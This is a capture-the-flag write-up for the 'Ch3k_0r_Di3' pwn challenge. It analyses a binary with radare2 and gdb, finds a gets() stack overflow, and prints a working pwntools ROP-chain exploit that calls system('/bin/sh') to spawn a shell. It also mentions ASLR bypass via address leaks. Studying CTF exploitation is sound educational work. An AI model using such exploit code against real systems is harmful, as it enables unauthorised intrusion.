Ch3k_0r_Di3 Pwn Challenge - Break_In CTF

Let's run the binary
```
# ./check 
Enter password: 
aaa
Wrong password!
```
I used radare2 to analyze the binary. "aaa" command will analyze everything. "afl" command can reveal all functions the binary have.
```
[0x004005e0]> afl
0x004005e0    1 42           entry0
0x00400620    4 42   -> 37   sym.deregister_tm_clones
0x00400650    4 58   -> 55   sym.register_tm_clones
0x00400690    3 34   -> 29   entry.fini0
0x004006c0    1 7            entry.init0
0x00400800    1 2            sym.__libc_csu_fini
0x00400804    1 9            sym._fini
0x00400790    3 101  -> 92   sym.__libc_csu_init
0x00400560    3 23           sym._init
0x00400610    1 2            sym._dl_relocate_static_pie
0x004006c7    6 199          main
0x00400590    1 6            sym.imp.puts
0x004005a0    1 6            sym.imp.setbuf
0x004005b0    1 6            sym.imp.system
0x004005c0    1 6            sym.imp.gets
0x004005d0    1 6            sym.imp.exit
```
There is a call to system() functions. using "iz" command, we can list strings the binary uses
```
[0x004005e0]> iz
[Strings]
Num Paddr      Vaddr      Len Size Section  Type  String
000 0x00000814 0x00400814  16  17 (.rodata) ascii Enter password: 
001 0x00000825 0x00400825  28  29 (.rodata) ascii Correct! You may proceed...\n
002 0x00000842 0x00400842   7   8 (.rodata) ascii /bin/sh
003 0x0000084a 0x0040084a  15  16 (.rodata) ascii Wrong password!
```
Wow, this will be easy since we have both system() function and "/bin/sh" string. If there is a buffer overflow in the program, we can get shell by chaining these two.
Disassembly of the main function showed this
```python
[0x004005e0]> pdf @main
<----------------------------------------------------SNIP----------------------------------------------------->
|	        c745fc000000.  mov dword [var_4h], 0
|           0x00400719      c745f8addead.  mov dword [var_8h], 0xdeaddead
|           0x00400720      c745f43fb33f.  mov dword [var_ch], 0xb33fb33f
|           0x00400727      488d3de60000.  lea rdi, qword str.Enter_password: ; 0x400814 ; "Enter password: " ; const char *s
|           0x0040072e      e85dfeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400733      488d4590       lea rax, qword [s]
|           0x00400737      4889c7         mov rdi, rax                ; char *s
|           0x0040073a      e881feffff     call sym.imp.gets           ; char *gets(char *s)
|           0x0040073f      817df8addead.  cmp dword [var_8h], 0xdeaddead
|       ,=< 0x00400746      753f           jne 0x400787
|       |   0x00400748      817df43fb33f.  cmp dword [var_ch], 0xb33fb33f
|      ,==< 0x0040074f      7536           jne 0x400787
|      ||   0x00400751      837dfc00       cmp dword [var_4h], 0
|     ,===< 0x00400755      741a           je 0x400771
|     |||   0x00400757      488d3dc70000.  lea rdi, qword str.Correct__You_may_proceed... ; 0x400825 ; "Correct! You may proceed...\n" ; const char *s
|     |||   0x0040075e      e82dfeffff     call sym.imp.puts           ; int puts(const char *s)
|     |||   0x00400763      488d3dd80000.  lea rdi, qword str.bin_sh   ; 0x400842 ; "/bin/sh" ; const char *string
|     |||   0x0040076a      e841feffff     call sym.imp.system         ; int system(const char *string)
|    ,====< 0x0040076f      eb16           jmp 0x400787
|    ||||   ; CODE XREF from main @ 0x400755
|    |`---> 0x00400771      488d3dd20000.  lea rdi, qword str.Wrong_password ; 0x40084a ; "Wrong password!" ; const char *s
|    | ||   0x00400778      e813feffff     call sym.imp.puts           ; int puts(const char *s)
|    | ||   0x0040077d      bf00000000     mov edi, 0                  ; int status
|    | ||   0x00400782      e849feffff     call sym.imp.exit           ; void exit(int status)
<----------------------------------------------------SNIP----------------------------------------------------->
```
The function takes our input with a gets() call. It's vulnerable to buffer overflows.
```
# python -c 'print "A" * 500' | ./check
Enter password: 
[1]    6430 done                python -c 'print "A" * 500' | 
       6431 segmentation fault  ./check
```
Overflow confirmed. Let's use gdb to find the offset to which we can control the buffer. I generated a pattern with pwntools cyclic
```python
Program received signal SIGSEGV, Segmentation fault.
0x000000000040078d in main ()                                              
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────── registers ─────────────────────────────────────────────────────
$rax   : 0x0                                                                                                                                          
$rbx   : 0x0                                                               
$rcx   : 0x00007ffff7faea00  →  0x00000000fbad208b                                                                                                    
$rdx   : 0x00007ffff7fb1590  →  0x0000000000000000
$rsp   : 0x00007fffffffde48  →  "paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava[...]"                                                             
$rbp   : 0x616161616161616f ("oaaaaaaa"?)
$rsi   : 0x00007ffff7faea83  →  0xfb1590000000000a
$rdi   : 0x0               
$rip   : 0x000000000040078d  →  <main+198> ret 
$r8    : 0x00007fffffffddd0  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$r9    : 0x00007ffff7fb6500  →  0x00007ffff7fb6500  →  [loop detected]
$r10   : 0xfffffffffffff3ef
$r11   : 0x246             
$r12   : 0x00000000004005e0  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffdf20  →  "raaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxa[...]"
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero CARRY parity adjust SIGN trap INTERRUPT direction OVERFLOW RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
```
This is a 64 bit binary. So things are a little different from 32 bit. We don't have an immediate RIP(Instruction Pointer) overwrite.
Segfault happens when the Instruction Pointer tries to fetch the return address from the stack. So we can find the offset by using our pattern contents
on the RSP(Stack Pointer) register. If I misunderstood any concepts, feel free to ping me.

Here the contents on the RSP is 0x00007fffffffde48. So we can find the offset like this
```python
gef➤  pattern offset 0x00007fffffffde48
[+] Searching '0x00007fffffffde48'
[+] Found at offset 120 (little-endian search) likely
[+] Found at offset 113 (big-endian search)
```
Attack plan:
Since we have call to system() and there is a reference to the "/bin/sh" string, we can use this directly with a simple rop chain. If this wasn't the case,
we could get shell by leaking a function address. With that leak we can find system() and "/bin/sh" address in the glibc. That's a common way of using rop chains to bypass ASLR(Address Space Layout Randomization)
 and NX / W^X (Non-Executable Stack / Write XOR Execute) which are mitigation techniques used in modern systems to prevent buffer overflow attacks. ASLR works by randomizing all addresses when the program runs each time.
 NX prevents stack from executing malicious shellcode. I explained this so that everyone can learn it.
 
For this to exploit we need a "pop rdi" gadget. Gadgets are assembly instructions, we can chain gadgets effectively construct our rop chain. "pop rdi" is needed because 64-bit function calling convention is poping function arguments to the registers in the order RDI, RSI, RDX and RCX.
We can get this gadget with ropper

```
# ropper --file check --search "pop rdi"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: check
0x00000000004007f3: pop rdi; ret;
```

Now we have everything. The exploit I made is

```python
#!/usr/bin/env python
from pwn import *
# got from radare2
system = p64(0x4005b0)
binsh = p64(0x400842)
pop_rdi = p64(0x4007f3)
expl = cyclic(120) # junk
expl += pop_rdi
expl += binsh
expl += system
print expl
```

Let's check.
```
# python check.py | ./check   
Enter password: 
[1]    7389 done                python check.py | 
       7390 segmentation fault  ./check
```
Hmm... Segfault again. This is not because the exploit failed. Its working. But we cannot interact with the shell like this.
But there is a simple and common technique to get shell. That is to use ```cat``` command. It will give us stdout and shell will not close
```
# (python check.py; cat) | ./check
Enter password: 
id
uid=1000(root) gid=1000(root) groups=1000(root)
ls  
begin  begin.py  check  check.py  flag.txt  leak  slide
cat flag.txt
FL4G{fake_flag_for_test}
```
Yes we got a shell. So we can use this technique against remote server to get the flag
